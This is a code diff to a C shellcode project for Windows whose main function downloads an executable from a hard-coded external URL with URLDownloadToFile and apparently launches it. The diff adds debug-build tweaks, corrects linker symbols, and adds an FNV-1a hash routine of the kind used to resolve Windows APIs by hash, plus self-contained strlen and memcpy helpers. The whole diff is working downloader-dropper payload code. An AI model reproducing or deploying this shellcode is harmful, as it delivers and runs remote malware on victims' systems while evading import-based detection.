@@ -38,6 +38,14 @@ __declspec(code_seg(".sc$000")) int shellcode(LPVOID arg) {
    for (size_t i=0; i<sizeof(PROCESS_INFORMATION); ++i)
       ((uint8_t *)(&process_information))[i] = 0;
 
+#if defined(_DEBUG)
+   while (*filename == 0)
+      ++filename;
+
+   while (*url == 0)
+      ++url;
+#endif
+
    if (iat()->URLDownloadToFile(NULL, url, filename, 0, NULL) != S_OK)
       return 1;
 
@@ -131,7 +139,7 @@ __declspec(code_seg(".sc$004"), naked) char *target_filename(void) {
       ret
    }
 }
-#pragma comment(linker, "/INCLUDE:TARGET_FILENAME")
+#pragma comment(linker, "/INCLUDE:_TARGET_FILENAME")
 #endif
 
 #pragma section(".sc$005", read, execute)
@@ -153,8 +161,39 @@ __declspec(code_seg(".sc$006"), naked) char *target_url(void) {
       ret
    }
 }
-#pragma comment(linker, "/INCLUDE:TARGET_URL")
+#pragma comment(linker, "/INCLUDE:_TARGET_URL")
 #endif
 
 #pragma section(".sc$007", read, execute)
 __declspec(allocate(".sc$007")) char TARGET_URL[] = "https://amethyst.systems/sheep.exe";
+
+#pragma section(".sc$008", read, execute)
+__declspec(code_seg(".sc$008")) uint32_t fnv321a(const char *str) {
+      uint32_t hash = 0x811c9dc5;
+
+   while (*str != 0) {
+      hash ^= *str;
+      hash *= 0x1000193;
+      ++str;
+   }
+
+   return hash;
+}
+
+#pragma section(".sc$c009", read, execute)
+__declspec(code_seg(".sc$c009")) size_t strlen_local(const char *str) {
+   const char *iter;
+
+   for (iter=str; *iter!=0; ++iter);
+
+   return (size_t)(iter - str);
+}
+
+#pragma section(".sc$c00a", read, execute)
+__declspec(code_seg(".sc$c00a")) void memcpy_local(void *dest, const void *src, size_t size) {
+   const uint8_t *src_u8 = (uint8_t *)src;
+   uint8_t *dest_u8 = (uint8_t *)dest;
+
+   for (size_t i=0; i<size; ++i)
+      dest_u8[i] = src_u8[i];
+}
